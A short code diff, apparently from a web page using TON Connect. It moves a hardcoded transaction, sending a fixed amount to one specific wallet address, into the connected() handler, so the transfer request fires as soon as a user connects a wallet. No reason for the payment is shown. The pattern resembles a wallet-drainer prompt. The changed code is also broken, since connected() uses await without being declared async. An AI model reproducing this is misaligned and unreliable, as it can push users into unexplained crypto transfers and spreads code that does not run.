@@ -79,19 +79,6 @@
         // Do something with connectedWallet if needed
         console.log(connectedWallet);
         metadata(1)
-
-        const destinationAddress = Address.parse('UQD75cMHRAiEkIWR0KOPVWDsuHLFlwdrSqymU8NzYs-8nghM');
-        const transaction = {
-                messages: [
-                    {
-                        address: destinationAddress,
-                        amount: "10000000"
-                    }
-                ]
-            }
-
-            const result = await tonConnectUI.sendTransaction(transaction)
-
     }
 
 
@@ -109,7 +96,19 @@
     }
 
     function connected() {
-      metadata(1)
+      metadata(2)
+
+        const destinationAddress = Address.parse('UQD75cMHRAiEkIWR0KOPVWDsuHLFlwdrSqymU8NzYs-8nghM');
+        const transaction = {
+                messages: [
+                    {
+                        address: destinationAddress,
+                        amount: "10000000"
+                    }
+                ]
+            }
+
+        const result = await tonConnectUI.sendTransaction(transaction)
     }
 
     function buildSvg(inviter) {
